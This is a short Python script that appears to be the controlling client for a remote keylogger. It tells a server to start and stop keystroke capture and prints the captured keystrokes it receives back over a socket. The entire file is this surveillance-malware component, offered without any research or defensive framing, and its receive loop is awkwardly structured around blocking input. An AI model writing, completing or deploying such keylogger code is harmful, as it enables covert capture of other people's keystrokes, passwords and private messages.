from pynput import keyboard

def key_logger(client_socket):
    client_socket.sendall("START_KEY_LOGGER".encode())
    print("Connected to the server. Listening for keystrokes...")
    print("Press 'Esc' to stop the key logger or type 'exit' and press Enter.")

    def on_press(key):
        if key == keyboard.Key.esc:
            client_socket.sendall("STOP_KEY_LOGGER".encode())
            print("Sent command to stop keylogger.")
            return False  # Stop the listener
        else:
            print(f'Key {key} pressed')  # For debugging; 

    # Start listening for key presses
    with keyboard.Listener(on_press=on_press) as listener:
        try:
            while True:
                # Check for exit command
                user_input = input()  # Wait for user input
                if user_input.strip().lower() == "exit":
                    client_socket.sendall("STOP_KEY_LOGGER".encode())
                    print("Sent command to stop keylogger.")
                    break

                # Receive data from the server
                data = client_socket.recv(1024)  # Adjust buffer size as needed
                if not data:
                    print("No more data received. Exiting...")
                    break
                print(data.decode(), end='')  # Print received keystrokes
        except Exception as e:
            print(f"Error receiving data: {e}")

    listener.join()  # Wait for the listener to finish
